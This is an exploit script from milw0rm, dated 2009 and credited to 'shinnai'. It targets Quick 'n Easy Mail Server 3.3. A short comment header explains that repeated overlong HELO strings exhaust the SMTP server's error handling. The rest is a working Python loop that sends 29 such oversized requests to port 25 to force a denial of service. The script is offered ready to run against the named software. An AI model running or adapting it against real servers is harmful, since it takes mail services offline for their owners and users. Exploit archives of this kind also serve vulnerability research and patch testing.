# ---------------------------------------------------------------
# Quick 'n Easy Mail Server 3.3 (Demo) Remote Denial of Service
# http://www.pablosoftwaresolutions.com/

# author: shinnai
# mail: shinnai[at]autistici[dot]org
# site: http://www.shinnai.net/

# When you pass a long string to the server, it checks for bof
# type attacks and answers with a:
# "<SMTP> Buffer overflow: DOS attack?"
# after 25 requests (more or less), server is unable to handle
# errors.
# An attacker can exploit this issue to trigger dos conditions.
# In case of succesful exploitation of this vulnerability,
# the server will answer to requests as below:
# "<SMTP> 421 Service not available"
#---------------------------------------------------------------"

import socket

try:
   for i in range(1,30):
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      conn = s.connect(("127.0.0.1",25))
      s.send('HELO ' + "AAA@AAAAAA.COM" * 4000 + '\r\n')
      d = s.recv(1024)
      print d
      s.close
   raw_input("Done. If server is still available, try to increase the number of requests.\n\nPress enter to quit...")
except:
   raw_input("Unable to connect!\n\nPress enter to quit...")

# milw0rm.com [2009-05-04]